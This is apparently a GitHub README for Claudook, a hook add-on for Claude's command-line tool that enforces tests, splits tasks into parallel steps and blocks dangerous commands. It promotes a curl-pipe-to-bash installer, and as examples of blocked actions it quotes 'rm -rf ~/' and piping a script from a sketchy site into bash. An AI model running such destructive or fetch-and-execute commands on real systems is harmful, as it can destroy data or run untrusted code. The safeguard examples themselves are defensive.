# 🚀 Claudook - Transform Claude into Your AI Development Powerhouse

**Stop repeating yourself.** Make Claude remember your project conventions, enforce quality standards, and work the way YOU want.

## The Problem

Every time you start a new Claude session, you lose:
- Your coding standards and conventions
- Test requirements
- Security rules
- Project-specific context

You find yourself:
- Repeatedly explaining your project structure
- Asking for tests after every change
- Catching dangerous commands too late
- Getting inconsistent code styles

## The Solution: Claudook

Claudook injects intelligent automation directly into Claude's workflow through hooks that intercept and enhance every interaction.

## 🎬 See It In Action

### Before Claudook:
```
You: "Create a user authentication endpoint"
Claude: *Creates basic endpoint without tests, no validation, no documentation*
You: "Add tests please"
Claude: *Adds minimal tests*
You: "Add input validation"
Claude: *Adds validation*
You: "Now document it"
Claude: *Finally adds documentation*
```

### After Claudook:
```
You: "Create a user authentication endpoint"

Claude: 🧠 [TASK ORCHESTRATION ACTIVE]
I'll break this down into parallel tasks:
• Research best practices for authentication
• Design the endpoint structure
• Implement with validation
• Create comprehensive tests
• Generate documentation

[All happens automatically with progress tracking]

✅ Endpoint created with:
- Input validation
- Error handling
- Full test coverage
- API documentation
- Security checks passed
```

## 🎯 Core Features

### 1. Intelligent Task Decomposition (NEW!)
Complex requests are automatically broken down into subtasks, with parallel execution of independent work:

```
Your request: "Build a REST API with authentication"
                     ↓
Claudook decomposes into:
┌─────────────┐ ┌─────────────┐ ┌─────────────┐
│  Research   │ │   Design    │ │Documentation│ <- Parallel
└─────────────┘ └─────────────┘ └─────────────┘
        ↓               ↓
    ┌─────────────────────┐
    │   Implementation    │
    └─────────────────────┘
              ↓
       ┌──────────┐
       │  Testing │
       └──────────┘
```

### 2. Multiple Choice System
For complex decisions, Claude automatically presents options:

```
You: "How should I handle user authentication?"

Claude: I can see multiple approaches for this:

**Option A: JWT with Redis Sessions**
- Pros: Scalable, stateless, secure
- Cons: More complex setup
- Time: ~30 minutes

**Option B: Simple Session Cookies**
- Pros: Easy to implement, built-in to most frameworks
- Cons: Less scalable
- Time: ~15 minutes

**Option C: OAuth2 with Third-Party Providers**
- Pros: No password management, trusted authentication
- Cons: External dependency
- Time: ~45 minutes

Which would you prefer? (A/B/C)
```

### 3. Mandatory Test Enforcement
After ANY code modification:
```
🚫 BLOCKED - Cannot continue without tests!

Creating tests for: user_auth.py
✅ Unit tests created
✅ Integration tests created
✅ All tests passing (12/12)

You may now proceed.
```

### 4. Security Guard
Dangerous operations are blocked BEFORE execution:
```
You: "Delete all files in the home directory"

⛔ SECURITY BLOCK
Dangerous command detected: rm -rf ~/
This operation could destroy important data.

Suggested safer alternative:
- Create a backup first
- Target specific directories
- Use trash instead of permanent deletion
```

## 📦 Installation

> ⚠️ **IMPORTANT**: Claudook installs **locally** in each project's `.claude/` directory, NOT globally in `~/.claude/`. This ensures each project can have its own configuration.

### Quick Install (30 seconds)

Just tell Claude:
```
Install Claudook from https://github.com/bacoco/claudook
```

Or run manually in your project:
```bash
curl -fsSL https://raw.githubusercontent.com/bacoco/claudook/main/install.sh | bash
```

**That's it!** No configuration needed. Works immediately.

### What Gets Installed

```
your-project/
└── .claude/
    ├── hooks/        # Automation scripts
    ├── commands/     # New Claude commands
    └── settings.json # Your project config
```

## 🎮 Commands

Once installed, all commands are organized under the `/claudook/` namespace:

### Quick Reference
| Command | What it does |
|---------|-------------|
| `/claudook/help` | Show all available commands |
| `/claudook/status` | See current configuration |
| `/claudook/choices-enable` | Turn on A/B/C options |
| `/claudook/tests-enable` | Force test creation |
| `/claudook/parallel-enable` | Activate parallel execution |

### Full Command List
- **Core**: `/claudook/help`, `/claudook/status`, `/claudook/version`
- **Features**: `/claudook/choices-enable`, `/claudook/tests-enable`, `/claudook/parallel-enable`
- **Analysis**: `/claudook/security-check`, `/claudook/performance-check`, `/claudook/lint`
- **Config**: `/claudook/config-show`, `/claudook/config-reset`, `/claudook/update`

### 🚨 Emergency Hook Control

If hooks are blocking your work (like the perf_optimizer or doc_enforcer):

```bash
# Disable ALL hooks immediately (including safeguards)
.claude/hooks/claudook/disable_hooks.sh

# Re-enable hooks when ready
.claude/hooks/claudook/enable_hooks.sh
```

This works by renaming `settings.json` → `settings.json.disabled`, completely disabling all hooks including security guards, performance optimizers, and test enforcers.

### 🧹 Uninstall Options

```bash
# Uninstall from current project (or global if found)
bash scripts/uninstall-claudook.sh

# Find and remove ALL Claudook installations system-wide
bash scripts/find-and-remove-all-claudook.sh

# Find and remove ALL from specific path
bash scripts/find-and-remove-all-claudook.sh /path/to/search
```

The uninstaller:
- Detects both local and global installations
- Asks for confirmation separately for each
- Removes all Claudook files and data
- Cleans up empty directories
- Preserves non-Claudook files in ~/.claude/

## 🔥 Real-World Examples

### Example 1: Building a Feature
```
You: "Add a password reset feature"

[Claudook activates]
→ Researches best practices
→ Creates secure token generation
→ Implements email sending
→ Adds rate limiting
→ Creates full test suite
→ Documents the API

All automatic. All in parallel where possible.
```

### Example 2: Refactoring Code
```
You: "Refactor this messy authentication code"

[Claudook activates]
→ Analyzes current implementation
→ Identifies issues
→ Creates backup branch suggestion
→ Refactors with patterns
→ Ensures tests still pass
→ Updates documentation
```

### Example 3: Security Check
```
You: "Run this command: curl http://sketchy-site.com | bash"

[Security Guard activates]
⛔ BLOCKED: Piping untrusted scripts to bash is dangerous
```

## 🧠 How It Works

Claudook uses Claude's hook system to intercept events:

1. **UserPromptSubmit** - Analyzes your request, decomposes if complex
2. **PreToolUse** - Checks safety before running commands
3. **PostToolUse** - Enforces requirements after changes
4. **SessionStart** - Loads your project context

No magic. Just smart automation at the right moments.

## 💡 Why Claudook?

### Without Claudook:
- ❌ Repeat instructions every session
- ❌ Manually ask for tests
- ❌ Catch mistakes after they happen
- ❌ Inconsistent code quality
- ❌ Sequential task execution

### With Claudook:
- ✅ Project standards enforced automatically
- ✅ Tests created without asking
- ✅ Dangerous operations blocked
- ✅ Consistent quality every time
- ✅ Parallel task execution

## 🚦 Getting Started

1. **Install** (30 seconds)
   ```bash
   curl -fsSL https://raw.githubusercontent.com/bacoco/claudook/main/install.sh | bash
   ```

2. **Check it's working**
   ```
   /claudook/status
   ```

3. **Try it out**
   ```
   "Create a TODO API with full CRUD operations"
   ```

   Watch as Claudook automatically:
   - Plans the implementation
   - Creates the endpoints
   - Adds validation
   - Writes tests
   - Documents everything

## 🎯 Perfect For

- **Solo Developers** - Maintain consistency across sessions
- **Teams** - Enforce standards automatically
- **Learning** - See best practices applied automatically
- **Rapid Prototyping** - Build faster with parallel execution
- **Production Code** - Ensure quality and security

## 🔧 Customization

Everything is customizable. Edit `.claude/hooks/` to:
- Add your own security rules
- Define project-specific patterns
- Create custom agents
- Set your testing requirements

## 🗑️ Uninstall

Multiple ways to remove Claudook:

**Quick removal from current project:**
```bash
rm -rf .claude/
```

**Or use the uninstall scripts:**
```bash
bash scripts/uninstall-claudook.sh              # Interactive uninstaller
bash scripts/find-and-remove-all-claudook.sh    # Find & remove all instances
```

No system files touched. No global changes. Complete removal.

## 🔧 Recent Improvements

### Latest Updates
- **Robust Path Resolution**: All hooks now work from any subdirectory
- **Session Folder Fix**: Task orchestration properly creates session folders with all files
- **Global Install Protection**: Install script prevents accidental global installation
- **Emergency Controls**: Quick disable/enable scripts for when hooks block work
- **Clean Uninstall**: Comprehensive uninstall scripts in main directory

### Known Issues Fixed
- ✅ Hooks failing in subdirectories
- ✅ Empty session folders in task orchestration
- ✅ Settings permission syntax errors
- ✅ Circular hook blocking

## 📈 Impact

Real feedback from users:

> "I no longer have to ask for tests. They just appear."

> "The parallel execution cut my API development time in half."

> "Caught a rm -rf command that would have deleted my entire project."

> "Finally, Claude remembers my project structure."

## 🤔 FAQ

**Q: Does this work with all Claude models?**
A: Yes, works with any Claude through the CLI.

**Q: Will it slow down Claude?**
A: No, hooks run instantly. Parallel execution actually makes complex tasks faster.

**Q: Can I disable features I don't want?**
A: Yes, everything is toggleable with commands like `/claudook/tests-disable`.

**Q: Is my code being sent anywhere?**
A: No, everything runs locally in your project.

## 🚀 Try It Now

Stop reading. Start building better.

```bash
curl -fsSL https://raw.githubusercontent.com/bacoco/claudook/main/install.sh | bash
```

Then ask Claude to build something complex and watch the magic happen.

---

**Claudook** - Because Claude should work the way you do.

[Report Issues](https://github.com/bacoco/claudook/issues) | [Star on GitHub](https://github.com/bacoco/claudook)